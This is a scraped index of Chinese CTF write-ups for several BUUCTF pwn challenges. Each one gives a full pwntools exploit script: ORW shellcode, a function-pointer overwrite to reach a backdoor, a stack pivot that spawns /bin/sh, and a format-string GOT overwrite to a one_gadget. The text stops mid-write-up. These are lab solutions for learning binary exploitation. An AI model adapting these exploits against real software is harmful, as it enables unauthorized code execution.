[\u0026#34;tmux\u0026#34;, \u0026#34;splitw\u0026#34;, \u0026#34;-h\u0026#34;] env = {\u0026#34;LD_PRELOAD\u0026#34;: libc_name} if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; b* 0x804858A c \u0026#34;\u0026#34;\u0026#34;) else: p = process(fn) # 两个elf，注意libc的版本 m_elf = ELF(fn) # libc = ELF(libc_name) def suclog(**kwargs): for k, v in kwargs.items(): if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) def send_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = False) -\u0026gt; bytes: if until is not None: if not isinstance(until, bytes): until = bytes(until, encoding=\u0026#34;UTF-8\u0026#34;) p.recvuntil(until) received = p.clean(timeout) if not no_show: info(f\u0026#34;received:{received}\u0026#34;) if not isinstance(content, bytes): content = bytes(content, encoding=\u0026#34;UTF-8\u0026#34;) p.send(content) return received def sendline_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = False) -\u0026gt; bytes: if not isinstance(content, bytes): content = bytes(content, encoding=\u0026#34;UTF-8\u0026#34;) send_after_clean(content + p.newline, until, timeout, no_show) def interactive_after_clean(timeout:int = 0.05, no_show: bool = False): received = p.clean(timeout) if not no_show: info(f\u0026#34;received:{received}\u0026#34;) p.interactive() def c_val(value: int, c_type: string) -\u0026gt; bytes: type_dict = { \u0026#34;long\u0026#34;: ctypes.c_long, \u0026#34;longlong\u0026#34;: ctypes.c_longlong, \u0026#34;ulong\u0026#34;: ctypes.c_ulong, \u0026#34;ulonglong\u0026#34;: ctypes.c_ulonglong, \u0026#34;int8\u0026#34;: ctypes.c_int8, \u0026#34;int16\u0026#34;: ctypes.c_int16, \u0026#34;int32\u0026#34;: ctypes.c_int32, \u0026#34;int64\u0026#34;: ctypes.c_int64, \u0026#34;uint8\u0026#34;: ctypes.c_uint8, \u0026#34;uint16\u0026#34;: ctypes.c_uint16, \u0026#34;uint32\u0026#34;: ctypes.c_uint32, \u0026#34;uint64\u0026#34;: ctypes.c_uint64, \u0026#34;int\u0026#34;: ctypes.c_int, \u0026#34;char\u0026#34;: ctypes.c_char, \u0026#34;bool\u0026#34;: ctypes.c_bool, \u0026#34;float\u0026#34;: ctypes.c_float, \u0026#34;double\u0026#34;: ctypes.c_double, \u0026#34;ushort\u0026#34;: ctypes.c_ushort, \u0026#34;byte\u0026#34;: ctypes.c_byte, \u0026#34;longdouble\u0026#34;: ctypes.c_longdouble, \u0026#34;size_t\u0026#34;: ctypes.c_size_t, \u0026#34;ssize_t\u0026#34;: ctypes.c_ssize_t, \u0026#34;ubyte\u0026#34;: ctypes.c_ubyte } try: return bytes(str(type_dict[c_type](value).value), encoding=\u0026#34;UTF-8\u0026#34;) except: try: return bytes(str(eval(f\u0026#34;ctypes.c_{c_type}(value).value\u0026#34;)), encoding=\u0026#34;UTF-8\u0026#34;) except: error(f\u0026#34;无法转换{value}或不存在类型{c_type}\u0026#34;) def load_libc(libc_name: str, *args, **kwargs) -\u0026gt; ctypes.CDLL: return ctypes.CDLL(libc_name, args, kwargs) def recv_and_transform(prev_string: str = None, from_bytes: bool = True,\\ is_canary: bool = False, bound: str = None) -\u0026gt; int: if prev_string is not None: if isinstance(prev_string, str): prev_string = bytes(prev_string, encoding=\u0026#34;UTF-8\u0026#34;) p.recvuntil(prev_string) if bound is not None and isinstance(bound, str): bound = bytes(bound, encoding=\u0026#34;UTF-8\u0026#34;) if from_bytes: if bound is not None: return ug(p.recvuntil(bound)[:-len(bound)]) if if_32: return ug(p.recv(4)) else: if is_canary: return ug(p.recv(7).rjust(8, b\u0026#34;\\x00\u0026#34;)) else: return ug(p.recv(6).ljust(8, b\u0026#34;\\x00\u0026#34;)) else: if bound is not None: return int(p.recvuntil(bound)[:-len(bound)], 16) else: if if_32: return int(p.recv(10), 16) else: if is_canary: return int(p.recv(18), 16) else: return int(p.recv(14), 16) def formula_compute(formula: bytes, precise: bool = False): if isinstance(formula, bytes): formula = formula.decode(\u0026#34;UTF-8\u0026#34;) formula = formula.strip() formula = formula.strip(\u0026#34;\\n\u0026#34;) formula = formula.replace(\u0026#34;x\u0026#34;, \u0026#34;*\u0026#34;) formula = formula.replace(\u0026#34;^\u0026#34;, \u0026#34;**\u0026#34;) formula = formula.replace(\u0026#34;÷\u0026#34;, \u0026#34;/\u0026#34;) if not precise: formula = formula.replace(\u0026#34;//\u0026#34;, \u0026#34;/\u0026#34;) formula = formula.replace(\u0026#34;/\u0026#34;, \u0026#34;//\u0026#34;) return bytes(str(eval(formula)), encoding=\u0026#34;UTF-8\u0026#34;) ... # 需要自行设定offset # 生成orw的shellcode payload = flat([ asm(shellcraft.open(\u0026#34;./flag\u0026#34;)), asm(shellcraft.read(\u0026#39;eax\u0026#39;, \u0026#39;esp\u0026#39;, 0xff)), asm(shellcraft.write(1, \u0026#39;esp\u0026#39;, 0xff)) ]) # payload = payload.ljust(0x30, b\u0026#34;\\x00\u0026#34;) + b\u0026#34;./flag\\x00\u0026#34; sendline_after_clean(payload, \u0026#34;Give my your shellcode:\u0026#34;) interactive_after_clean() 没啥好讲的，就是一个生成orw的shellcode的题目，记一下orw的shellcode的生成函数就好\n","date":"2022年12月29日","permalink":"https://peterliuzhi.top/writeup/%E7%94%9F%E6%88%90orw-shellcodebuuctf-pwnable_orw/","section":"writeup","summary":"Never mistake activity for achievement. — John Wooden 原题链接 exp # 自动生成头部 from pwn import * from pwn import p64, p32, u32, u64, p8 from LibcSearcher import LibcSearcher import ctypes pss: bool = True fn: str = \u0026#34;./orw\u0026#34; libc_name:str = \u0026#34;\u0026#34; port: str = \u0026#34;26851\u0026#34; if_32: bool = True if_debug:bool = False pg = p32 if if_32 else p64 ug = u32 if if_32 else u64 context(log_level=\u0026#34;debug\u0026#34;,","tags":["pwn","生成ORW shellcode"],"title":"【生成ORW shellcode】BUUCTF pwnable_orw"},{"categories":["writeup"],"contents":" Our shared values define us more than our differences. And acknowledging those shared values can see us through our challenges today if we have the wisdom to trust in them again. — John McCain\n原题链接\n查看程序架构 ida伪代码 典型的C++语法，这里应该有两个类，Admin继承自User： 其中我们发现Admin::shell正是我们需要的后门函数： 那么我们只要想办法调用这个函数即可 整个程序有两个输入点： 只要密码正确，程序就会调用v8指向的函数 而v8又是什么呢？v8的值是v3的指针，这里就有一个致命漏洞，v2是一个栈指针而不是.bss节的指针。所以如果返回main函数后再调用其他函数，就可能把这个地址覆盖掉 我们看看汇编代码这个栈指针在哪里 看来这个v2在[rbp+var_18]处，而这个值，我们在read_password中是可以覆盖的 这样我们就可以将其覆盖为Admin::shell了\nexp # 自动生成头部 from pwn import * from pwn import p64, p32, u32, u64, p8 from LibcSearcher import LibcSearcher import ctypes pss: bool = True fn: str = \u0026#34;./login\u0026#34; libc_name:str = \u0026#34;\u0026#34; port: str = \u0026#34;25767\u0026#34; if_32: bool = False if_debug:bool = False pg = p32 if if_32 else p64 ug = u32 if if_32 else u64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) context.terminal = [\u0026#34;tmux\u0026#34;, \u0026#34;splitw\u0026#34;, \u0026#34;-h\u0026#34;] env = {\u0026#34;LD_PRELOAD\u0026#34;: libc_name} if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; break main c \u0026#34;\u0026#34;\u0026#34;) else: p = process(fn) # 两个elf，注意libc的版本 m_elf = ELF(fn) # libc = ELF(libc_name) def suclog(**kwargs): for k, v in kwargs.items(): if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) def send_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = False) -\u0026gt; bytes: if until is not None: p.recvuntil(flat(until)) received = p.clean(timeout) if not no_show: info(f\u0026#34;received:\\n{received.decode(\u0026#39;UTF-8\u0026#39;)}\u0026#34;) p.send(flat(content)) return received def sendline_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = False) -\u0026gt; bytes: send_after_clean([content, p.newline], until, timeout, no_show) def interactive_after_clean(timeout:int = 0.05, no_show: bool = False): received = p.clean(timeout) if not no_show: info(f\u0026#34;received:\\n{received.decode(\u0026#39;UTF-8\u0026#39;)}\u0026#34;) p.interactive() def c_val(value: int, c_type: string) -\u0026gt; bytes: type_dict = { \u0026#34;long\u0026#34;: ctypes.c_long, \u0026#34;longlong\u0026#34;: ctypes.c_longlong, \u0026#34;ulong\u0026#34;: ctypes.c_ulong, \u0026#34;ulonglong\u0026#34;: ctypes.c_ulonglong, \u0026#34;int8\u0026#34;: ctypes.c_int8, \u0026#34;int16\u0026#34;: ctypes.c_int16, \u0026#34;int32\u0026#34;: ctypes.c_int32, \u0026#34;int64\u0026#34;: ctypes.c_int64, \u0026#34;uint8\u0026#34;: ctypes.c_uint8, \u0026#34;uint16\u0026#34;: ctypes.c_uint16, \u0026#34;uint32\u0026#34;: ctypes.c_uint32, \u0026#34;uint64\u0026#34;: ctypes.c_uint64, \u0026#34;int\u0026#34;: ctypes.c_int, \u0026#34;char\u0026#34;: ctypes.c_char, \u0026#34;bool\u0026#34;: ctypes.c_bool, \u0026#34;float\u0026#34;: ctypes.c_float, \u0026#34;double\u0026#34;: ctypes.c_double, \u0026#34;ushort\u0026#34;: ctypes.c_ushort, \u0026#34;byte\u0026#34;: ctypes.c_byte, \u0026#34;longdouble\u0026#34;: ctypes.c_longdouble, \u0026#34;size_t\u0026#34;: ctypes.c_size_t, \u0026#34;ssize_t\u0026#34;: ctypes.c_ssize_t, \u0026#34;ubyte\u0026#34;: ctypes.c_ubyte } try: return bytes(str(type_dict[c_type](value).value), encoding=\u0026#34;UTF-8\u0026#34;) except: try: return bytes(str(eval(f\u0026#34;ctypes.c_{c_type}(value).value\u0026#34;)), encoding=\u0026#34;UTF-8\u0026#34;) except: error(f\u0026#34;无法转换{value}或不存在类型{c_type}\u0026#34;) def load_libc(libc_name: str, *args, **kwargs) -\u0026gt; ctypes.CDLL: return ctypes.CDLL(libc_name, args, kwargs) def recv_and_transform(prev_string: str = None, from_bytes: bool = True,\\ is_canary: bool = False, bound: str = None) -\u0026gt; int: if prev_string is not None: p.recvuntil(flat(prev_string)) if bound is not None: bound = flat(bound) if from_bytes: if bound is not None: return ug(p.recvuntil(bound)[:-len(bound)]) if if_32: return ug(p.recv(4)) else: if is_canary: return ug(p.recv(7).rjust(8, b\u0026#34;\\x00\u0026#34;)) else: return ug(p.recv(6).ljust(8, b\u0026#34;\\x00\u0026#34;)) else: if bound is not None: return int(p.recvuntil(bound)[:-len(bound)], 16) else: if if_32: return int(p.recv(10), 16) else: if is_canary: return int(p.recv(18), 16) else: return int(p.recv(14), 16) def formula_compute(formula: bytes, precise: bool = False): if isinstance(formula, bytes): formula = formula.decode(\u0026#34;UTF-8\u0026#34;) formula = formula.strip() formula = formula.strip(\u0026#34;\\n\u0026#34;) formula = formula.replace(\u0026#34;x\u0026#34;, \u0026#34;*\u0026#34;) formula = formula.replace(\u0026#34;^\u0026#34;, \u0026#34;**\u0026#34;) formula = formula.replace(\u0026#34;÷\u0026#34;, \u0026#34;/\u0026#34;) if not precise: formula = formula.replace(\u0026#34;//\u0026#34;, \u0026#34;/\u0026#34;) formula = formula.replace(\u0026#34;/\u0026#34;, \u0026#34;//\u0026#34;) return bytes(str(eval(formula)), encoding=\u0026#34;UTF-8\u0026#34;) ... backdoor = 0x400E88 sendline_after_clean(\u0026#34;admin\u0026#34;) payload = flat([ \u0026#34;2jctf_pa5sw0rd\u0026#34;.ljust(0x60-0x18, \u0026#34;\\x00\u0026#34;), backdoor ]) sendline_after_clean(payload) interactive_after_clean() ","date":"2022年12月29日","permalink":"https://peterliuzhi.top/writeup/c++pwnzjctf-2019login/","section":"writeup","summary":"Our shared values define us more than our differences. And acknowledging those shared values can see us through our challenges today if we have the wisdom to trust in them again. — John McCain 原题链接 查看程序架构 ida伪代码 典型的C++语法，这里应该有两个类，Admin继承","tags":["pwn","C++Pwn"],"title":"【C++Pwn】[ZJCTF 2019]Login"},{"categories":["writeup"],"contents":" If you change the way you look at things, the things you look at change. — Wayne Dyer\n原题链接\n查看程序架构 ida伪代码 限制溢出的字符到ret只能有一个地址，没有后门函数，典型栈迁移\nexp # 自动生成头部 from pwn import * from pwn import p64, p32, u32, u64, p8 from LibcSearcher import LibcSearcher import ctypes pss: bool = True fn: str = \u0026#34;./ciscn_s_4\u0026#34; libc_name:str = \u0026#34;\u0026#34; port: str = \u0026#34;25030\u0026#34; if_32: bool = True if_debug:bool = False pg = p32 if if_32 else p64 ug = u32 if if_32 else u64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) context.terminal = [\u0026#34;tmux\u0026#34;, \u0026#34;splitw\u0026#34;, \u0026#34;-h\u0026#34;] env = {\u0026#34;LD_PRELOAD\u0026#34;: libc_name} if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; break main c \u0026#34;\u0026#34;\u0026#34;) else: p = process(fn) # 两个elf，注意libc的版本 m_elf = ELF(fn) # libc = ELF(libc_name) def suclog(**kwargs): for k, v in kwargs.items(): if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) def send_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = False) -\u0026gt; bytes: if until is not None: p.recvuntil(flat(until)) received = p.clean(timeout) if not no_show: info(f\u0026#34;received:\\n{received.decode(\u0026#39;UTF-8\u0026#39;)}\u0026#34;) p.send(flat(content)) return received def sendline_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = False) -\u0026gt; bytes: send_after_clean([content, p.newline], until, timeout, no_show) def interactive_after_clean(timeout:int = 0.05, no_show: bool = False): received = p.clean(timeout) if not no_show: info(f\u0026#34;received:\\n{received.decode(\u0026#39;UTF-8\u0026#39;)}\u0026#34;) p.interactive() def c_val(value: int, c_type: string) -\u0026gt; bytes: type_dict = { \u0026#34;long\u0026#34;: ctypes.c_long, \u0026#34;longlong\u0026#34;: ctypes.c_longlong, \u0026#34;ulong\u0026#34;: ctypes.c_ulong, \u0026#34;ulonglong\u0026#34;: ctypes.c_ulonglong, \u0026#34;int8\u0026#34;: ctypes.c_int8, \u0026#34;int16\u0026#34;: ctypes.c_int16, \u0026#34;int32\u0026#34;: ctypes.c_int32, \u0026#34;int64\u0026#34;: ctypes.c_int64, \u0026#34;uint8\u0026#34;: ctypes.c_uint8, \u0026#34;uint16\u0026#34;: ctypes.c_uint16, \u0026#34;uint32\u0026#34;: ctypes.c_uint32, \u0026#34;uint64\u0026#34;: ctypes.c_uint64, \u0026#34;int\u0026#34;: ctypes.c_int, \u0026#34;char\u0026#34;: ctypes.c_char, \u0026#34;bool\u0026#34;: ctypes.c_bool, \u0026#34;float\u0026#34;: ctypes.c_float, \u0026#34;double\u0026#34;: ctypes.c_double, \u0026#34;ushort\u0026#34;: ctypes.c_ushort, \u0026#34;byte\u0026#34;: ctypes.c_byte, \u0026#34;longdouble\u0026#34;: ctypes.c_longdouble, \u0026#34;size_t\u0026#34;: ctypes.c_size_t, \u0026#34;ssize_t\u0026#34;: ctypes.c_ssize_t, \u0026#34;ubyte\u0026#34;: ctypes.c_ubyte } try: return bytes(str(type_dict[c_type](value).value), encoding=\u0026#34;UTF-8\u0026#34;) except: try: return bytes(str(eval(f\u0026#34;ctypes.c_{c_type}(value).value\u0026#34;)), encoding=\u0026#34;UTF-8\u0026#34;) except: error(f\u0026#34;无法转换{value}或不存在类型{c_type}\u0026#34;) def load_libc(libc_name: str, *args, **kwargs) -\u0026gt; ctypes.CDLL: return ctypes.CDLL(libc_name, args, kwargs) def recv_and_transform(prev_string: str = None, from_bytes: bool = True,\\ is_canary: bool = False, bound: str = None) -\u0026gt; int: if prev_string is not None: p.recvuntil(flat(prev_string)) if bound is not None: bound = flat(bound) if from_bytes: if bound is not None: return ug(p.recvuntil(bound)[:-len(bound)]) if if_32: return ug(p.recv(4)) else: if is_canary: return ug(p.recv(7).rjust(8, b\u0026#34;\\x00\u0026#34;)) else: return ug(p.recv(6).ljust(8, b\u0026#34;\\x00\u0026#34;)) else: if bound is not None: return int(p.recvuntil(bound)[:-len(bound)], 16) else: if if_32: return int(p.recv(10), 16) else: if is_canary: return int(p.recv(18), 16) else: return int(p.recv(14), 16) def formula_compute(formula: bytes, precise: bool = False): if isinstance(formula, bytes): formula = formula.decode(\u0026#34;UTF-8\u0026#34;) formula = formula.strip() formula = formula.strip(\u0026#34;\\n\u0026#34;) formula = formula.replace(\u0026#34;x\u0026#34;, \u0026#34;*\u0026#34;) formula = formula.replace(\u0026#34;^\u0026#34;, \u0026#34;**\u0026#34;) formula = formula.replace(\u0026#34;÷\u0026#34;, \u0026#34;/\u0026#34;) if not precise: formula = formula.replace(\u0026#34;//\u0026#34;, \u0026#34;/\u0026#34;) formula = formula.replace(\u0026#34;/\u0026#34;, \u0026#34;//\u0026#34;) return bytes(str(eval(formula)), encoding=\u0026#34;UTF-8\u0026#34;) ... offset: int = 0x28 backdoor = m_elf.sym[\u0026#39;hack\u0026#39;] payload = b\u0026#34;a\u0026#34;*0x27 + b\u0026#34;b\u0026#34; send_after_clean(payload, no_show=True) buf = recv_and_transform(\u0026#34;b\u0026#34;) - 0x38 leave_ret = 0x08048562 call_system = 0x8048559 payload = flat([ 0, call_system, buf + 4*3, \u0026#34;/bin/sh\\x00\u0026#34; ]).ljust(0x28, b\u0026#34;\\x00\u0026#34;) payload += flat([ buf, leave_ret ]) sendline_after_clean(payload, no_show=True) interactive_after_clean(no_show=True) 其中，因为call会自动将下一条指令入栈，所以就不用在栈中空出一位给ret了，buf+4*3的位置会被调整为esp+8\n","date":"2022年12月29日","permalink":"https://peterliuzhi.top/writeup/call32%E6%A0%88%E8%BF%81%E7%A7%BBbuuctf-ciscn_2019_s_4/","section":"writeup","summary":"If you change the way you look at things, the things you look at change. — Wayne Dyer 原题链接 查看程序架构 ida伪代码 限制溢出的字符到ret只能有一个地址，没有后门函数，典型栈迁移 exp # 自动生成头部 from pwn","tags":["pwn","32位系统call","栈迁移"],"title":"【call32】【栈迁移】BUUCTF ciscn_2019_s_4"},{"categories":["writeup"],"contents":" I have an everyday religion that works for me. Love yourself first, and everything else falls into line. — Lucille Ball\n【Write-up】BUUCTF others_shellcode 原题链接\n【Write-up】BUUCTF others_shellcode checksec 查看程序架构 ida 查看程序伪代码 构建 exp checksec 查看程序架构 $ checksec --file shell_asm [*] \u0026#39;/home/peterl/security/workspace/shell_asm/shell_asm\u0026#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled ida 查看程序伪代码 然后我们看到它的getShell函数：\n我们看到它里面有一句很奇怪的__asm { int 80h; LINUX - sys_execve }，这是干什么的？\n我们按 tab 看一下它对应的汇编代码：\n这里我们已经看出一点端倪了，没错，这一句就是内联汇编（内联汇编使用“__asm”（C++）和“asm”（C 和 C++）关键字声明）\n具体可以看以下推文：\nMIPS 指令集：内嵌汇编 asm 语法介绍 C 语言内嵌汇编**asm__**volatile__ C 语言 ASM 汇编内嵌语法 至于int 80的作用，请参考我写的这篇 writeup的第二个 exp\n构建 exp 这题根本不需要 exp，直接nc 网址 端口号即可，程序会自动执行execve(\u0026quot;/bin/sh\u0026quot;, 0, 0)\n这题的主要功能就是介绍int 80的作用还有内联汇编\n","date":"2022年12月29日","permalink":"https://peterliuzhi.top/writeup/c%E5%86%85%E5%B5%8C%E6%B1%87%E7%BC%96others_shellcode/","section":"writeup","summary":"I have an everyday religion that works for me. Love yourself first, and everything else falls into line. — Lucille Ball 【Write-up】BUUCTF others_shellcode 原题链接 【Write-up】BUUCTF others_shellcode checksec 查看程序架构 ida 查看程序伪代码 构","tags":["pwn","C内嵌汇编"],"title":"【C内嵌汇编】others_shellcode"},{"categories":["writeup"],"contents":" Love is blind; friendship closes its eyes. — Friedrich Nietzsche\n查看程序架构 ida伪代码 典型的格式化字符串漏洞，我们gdb到printf(format);那里看下栈：\n可以看到格式化字符串在栈上储存要先吞掉一个字符才到第8个参数的位置\n我们也可以看到在第0x97个参数的位置存储了__libc_start_main+247的值，我们可以用其计算出libc的基址\n那么答案就很简单了，改写printf的got值为system即可\nexp # 自动生成头部 from pwn import * from pwn import p64, p32, u32, u64, p8 from LibcSearcher import LibcSearcher import ctypes pss: bool = True fn: str = \u0026#34;./axb_2019_fmt32\u0026#34; libc_name:str = \u0026#34;/home/kali/share/share_files/security/buuctf_libc/libc-2.23_32.so\u0026#34; port: str = \u0026#34;25269\u0026#34; if_32: bool = True if_debug:bool = False pg = p32 if if_32 else p64 ug = u32 if if_32 else u64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) context.terminal = [\u0026#34;tmux\u0026#34;, \u0026#34;splitw\u0026#34;, \u0026#34;-h\u0026#34;] env = {\u0026#34;LD_PRELOAD\u0026#34;: libc_name} if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; break main c \u0026#34;\u0026#34;\u0026#34;) else: p = process(fn, env=env) # 两个elf，注意libc的版本 m_elf = ELF(fn) libc = ELF(libc_name) def suclog(**kwargs): for k, v in kwargs.items(): if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) def send_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True) -\u0026gt; bytes: if until is not None: p.recvuntil(flat(until)) received = p.clean(timeout) if not no_show: info(f\u0026#34;received:\\n{received.decode(\u0026#39;UTF-8\u0026#39;)}\u0026#34;) p.send(flat(content)) return received def sendline_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True) -\u0026gt; bytes: send_after_clean([content, p.newline], until, timeout, no_show) def interactive_after_clean(timeout:int = 0.05, no_show: bool = True): received = p.clean(timeout) if not no_show: info(f\u0026#34;received:\\n{received.decode(\u0026#39;UTF-8\u0026#39;)}\u0026#34;) p.interactive() def c_val(value: int, c_type: string) -\u0026gt; bytes: type_dict = { \u0026#34;long\u0026#34;: ctypes.c_long, \u0026#34;longlong\u0026#34;: ctypes.c_longlong, \u0026#34;ulong\u0026#34;: ctypes.c_ulong, \u0026#34;ulonglong\u0026#34;: ctypes.c_ulonglong, \u0026#34;int8\u0026#34;: ctypes.c_int8, \u0026#34;int16\u0026#34;: ctypes.c_int16, \u0026#34;int32\u0026#34;: ctypes.c_int32, \u0026#34;int64\u0026#34;: ctypes.c_int64, \u0026#34;uint8\u0026#34;: ctypes.c_uint8, \u0026#34;uint16\u0026#34;: ctypes.c_uint16, \u0026#34;uint32\u0026#34;: ctypes.c_uint32, \u0026#34;uint64\u0026#34;: ctypes.c_uint64, \u0026#34;int\u0026#34;: ctypes.c_int, \u0026#34;char\u0026#34;: ctypes.c_char, \u0026#34;bool\u0026#34;: ctypes.c_bool, \u0026#34;float\u0026#34;: ctypes.c_float, \u0026#34;double\u0026#34;: ctypes.c_double, \u0026#34;ushort\u0026#34;: ctypes.c_ushort, \u0026#34;byte\u0026#34;: ctypes.c_byte, \u0026#34;longdouble\u0026#34;: ctypes.c_longdouble, \u0026#34;size_t\u0026#34;: ctypes.c_size_t, \u0026#34;ssize_t\u0026#34;: ctypes.c_ssize_t, \u0026#34;ubyte\u0026#34;: ctypes.c_ubyte } try: return bytes(str(type_dict[c_type](value).value), encoding=\u0026#34;UTF-8\u0026#34;) except: try: return bytes(str(eval(f\u0026#34;ctypes.c_{c_type}(value).value\u0026#34;)), encoding=\u0026#34;UTF-8\u0026#34;) except: error(f\u0026#34;无法转换{value}或不存在类型{c_type}\u0026#34;) def load_libc(libc_name: str, *args, **kwargs) -\u0026gt; ctypes.CDLL: return ctypes.CDLL(libc_name, args, kwargs) def recv_and_transform(prev_string: str = None, from_bytes: bool = True,\\ is_canary: bool = False, bound: str = None) -\u0026gt; int: if prev_string is not None: p.recvuntil(flat(prev_string)) if bound is not None: bound = flat(bound) if from_bytes: if bound is not None: return ug(p.recvuntil(bound)[:-len(bound)]) if if_32: return ug(p.recv(4)) else: if is_canary: return ug(p.recv(7).rjust(8, b\u0026#34;\\x00\u0026#34;)) else: return ug(p.recv(6).ljust(8, b\u0026#34;\\x00\u0026#34;)) else: if bound is not None: return int(p.recvuntil(bound)[:-len(bound)], 16) else: if if_32: return int(p.recv(10), 16) else: if is_canary: return int(p.recv(18), 16) else: return int(p.recv(14), 16) def formula_compute(formula: bytes, precise: bool = False): if isinstance(formula, bytes): formula = formula.decode(\u0026#34;UTF-8\u0026#34;) formula = formula.strip() formula = formula.strip(\u0026#34;\\n\u0026#34;) formula = formula.replace(\u0026#34;x\u0026#34;, \u0026#34;*\u0026#34;) formula = formula.replace(\u0026#34;^\u0026#34;, \u0026#34;**\u0026#34;) formula = formula.replace(\u0026#34;÷\u0026#34;, \u0026#34;/\u0026#34;) if not precise: formula = formula.replace(\u0026#34;//\u0026#34;, \u0026#34;/\u0026#34;) formula = formula.replace(\u0026#34;/\u0026#34;, \u0026#34;//\u0026#34;) return bytes(str(eval(formula)), encoding=\u0026#34;UTF-8\u0026#34;) ... format_payload = b\u0026#34;%151$p\u0026#34; sendline_after_clean(format_payload) libcbase = recv_and_transform(\u0026#34;:\u0026#34;, False, False, \u0026#34;\\n\u0026#34;) - 247 - libc.sym[\u0026#39;__libc_start_main\u0026#39;] system_addr = libcbase + libc.sym[\u0026#39;system\u0026#39;] binsh_addr = libcbase + next(libc.search(b\u0026#34;/bin/sh\u0026#34;)) one_gadget = libcbase + 0x3a80e suclog( libcbase=libcbase, system_addr=system_addr, binsh_addr=binsh_addr ) format_payload = b\u0026#34;a\u0026#34; + fmtstr_payload(8, {m_elf.got[\u0026#39;printf\u0026#39;]:one_gadget}, 10) sendline_after_clean(format_payload, no_show=False) sendline_after_clean(b\u0026#34;/bin/sh\u0026#34;) interactive_after_clean() ","date":"2022年12月29日","permalink":"https://peterliuzhi.top/writeup/fmtstr_payload%E5%87%BD%E6%95%B0buuctf-axb_2019_fmt32/","section":"writeup","summary":"Love is blind; friendship closes its eyes. — Friedrich Nietzsche 查看程序架构 ida伪代码 典型的格式化字符串漏洞，我们gdb到printf(format);那里看下栈： 可以看到格式化字符串在栈上储","tags":["pwn","fmtstr_payload函数","格式化字符串"],"title":"【fmtstr_payload函数】BUUCTF axb_2019_fmt32"},{"categories":["writeup"],"contents":" We respect our elders. There is wisdom that comes from experience, and I am not going to stop learning from wise counsel. — Marcia Fudge\n原题链接\n【Write-up】BUUCTF 【HarekazeCTF2019】baby_rop checksec 查看程序架构 ida 查看程序伪代码 gdb 调试 构建 exp 完整 exp checksec 查看程序架构 $ checksec --file babyrop [*] \u0026#39;/home/peterl/security/workspace/babyrop/babyrop\u0026#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) 64 位程序，不能使用 shellcode\nida 查看程序伪代码 有 scanf，有 printf，看起来可能是普通的栈溢出，我们可以调试看看\n此题用不了格式化字符串漏洞，因为我们控制不了 format 字符串，只能控制后面跟的 args，而 printf 只会对 format 字符串作解析\ngdb 调试 这题比较坑的是第一条输出语句是system函数输出的，因此我们在 gdb 调试之前就要加一句set follow-fork-mode parent，这条命令将调试追踪固定在父程序上，不让他跑去追踪子程序\n我们通过 ida 找到call _printf的地址，使用b* 0x40060F打个断点，这时候如果直接 run 就需要输入了，所以我们先cyclic 50一个规律字符串用以输入\npwndbg\u0026gt; cyclic 50 aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama 然后直接r\n然后我们看到栈情况是这样的：\n00:0000│ rsi rsp 0x7fffffffd770 ◂— \u0026#39;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama\u0026#39; 01:0008│ 0x7fffffffd778 ◂— \u0026#39;caaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama\u0026#39; 02:0010│ rbp 0x7fffffffd780 ◂— \u0026#39;eaaafaaagaaahaaaiaaajaaakaaalaaama\u0026#39; 03:0018│ 0x7fffffffd788 ◂— \u0026#39;gaaahaaaiaaajaaakaaalaaama\u0026#39; 04:0020│ 0x7fffffffd790 ◂— \u0026#39;iaaajaaakaaalaaama\u0026#39; 05:0028│ 0x7fffffffd798 ◂— \u0026#39;kaaalaaama\u0026#39; 06:0030│ 0x7fffffffd7a0 ◂— 0x1ff00616d /* \u0026#39;ma\u0026#39; */ 作者此时心中一喜，连按n继续到ret指令，看一看此时rsp栈顶指针指向哪里\n我们发现 return 